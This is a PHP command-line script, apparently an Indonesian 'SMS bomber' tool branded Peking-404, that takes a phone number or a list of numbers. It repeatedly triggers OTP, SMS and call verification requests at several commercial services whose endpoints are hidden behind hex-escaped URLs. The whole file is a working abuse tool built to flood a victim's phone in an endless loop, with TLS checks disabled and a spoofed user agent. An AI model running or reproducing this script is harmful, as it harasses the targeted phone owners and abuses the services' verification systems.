<?php
$R = "\e[91m";

$RR = "\e[91;7m";

$G = "\e[92m";

$GG = "\e[92;7m";

$B = "\e[36m";

$BB = "\e[36;7m";

$Y = "\e[93m";

$YY = "\e[93;7m";

$X = "\e[0m";

$ua = 'Mozilla/5.0 (Linux; Android 5.1.1; Andromax A16C3H Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36';


system('clear');



if(function_exists('pcntl_signal')) {

	declare(ticks = 1);

	function signal_handler($signal) {

		global $Y,$X;

		switch($signal) {

		case SIGTERM:

		die($Y."\n==============[]Peking-404[]=====(√√√)>".$X."\n");

		case SIGKILL:

		die($Y."\n==============[]Peking-404[]=====(√√)>".$X."\n");

		case SIGINT:

		die($Y."\n==============[]Peking-404[]=====(√)>".$X."\n");

		}

	}

	pcntl_signal(SIGTERM, "signal_handler");

	pcntl_signal(SIGINT, "signal_handler");

}
function banner(){

echo "\e[1m\e[1m\e[93m
++++++++++++++++++++++++++++++++++++++++++++++++++++++++
KON.TOOLS   \e[91m\e[91;7m\e[1m
 ____      _    _                   _  _    ___  _  _    
|  _ \ ___| | _(_)_ __   __ _      | || |  / _ \| || |   
| |_) / _ \ |/ / | '_ \ / _` |_____| || |_| | | | || |_  \e[0m\e[97;7m\e[1m
|  __/  __/   <| | | | | (_| |_____|__   _| |_| |__   _| 
|_|   \___|_|\_\_|_| |_|\__, |        |_|  \___/   |_|   
                        |___/                            \e[0m
                          \e[1m\e[93m           Gua Ganteng Tq:)
++++++++++++++++++++++++++++++++++++++++++++++++++++++++
\e[0m\n";
}
function post_data($url,$data) {

	global $ua;

	$ch=curl_init($url);

	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

	curl_setopt($ch, CURLOPT_USERAGENT, $ua);

	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

	return curl_exec($ch);

	curl_close($ch);

	}


banner();	
echo "\n";

isset($argv[1]) OR die($RR."[!]==php peking 628xxxxxx==[!]\n".$X);

if(is_numeric($argv[1])) {


	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70","msisdn=".$argv[1]."&accept=call");

	while(1) {

		echo "\e[1m[✔]Berhasil Terkirim Ke[] >> ".$G.$argv[1].$X."\n";	


      post_data("\x68\x74\x74\x70\x73\x3A\x2F\x2F\x74\x64\x77\x69\x64\x6D\x2E\x74\x65\x6C\x6B\x6F\x6D\x73\x65\x6C\x2E\x63\x6F\x6D\x2F\x70\x61\x73\x73\x77\x6F\x72\x64\x6C\x65\x73\x73\x2F\x73\x74\x61\x72\x74","phone_number=%2B".$argv[1]."&connection=sms");

		post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$argv[1]."&smsType=1");

		post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50","phone_number=".$argv[1]);

	}

}

if(!file_exists($argv[1])) {

	die($RR."[!] File Tidak Ada[!]".$X."\n");

}

$argv[1]=explode("\n",file_get_contents($argv[1]));

$argv[1]=str_replace(' ','',$argv[1]);

foreach($argv[1] as $argv[2]):

	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70","msisdn=".$argv[2]."&accept=call");

endforeach;

while(1) {

foreach($argv[1] as $argv[2]):

echo "\e[1m[✔]Berhasil Terkirim Ke[] >> ".$G.$argv[1].$X."\n";	


      post_data("\x68\x74\x74\x70\x73\x3A\x2F\x2F\x74\x64\x77\x69\x64\x6D\x2E\x74\x65\x6C\x6B\x6F\x6D\x73\x65\x6C\x2E\x63\x6F\x6D\x2F\x70\x61\x73\x73\x77\x6F\x72\x64\x6C\x65\x73\x73\x2F\x73\x74\x61\x72\x74","phone_number=%2B".$argv[2]."&connection=sms");

	post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$argv[2]."&smsType=1");

	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50","phone_number=".$argv[2]);

endforeach;

}

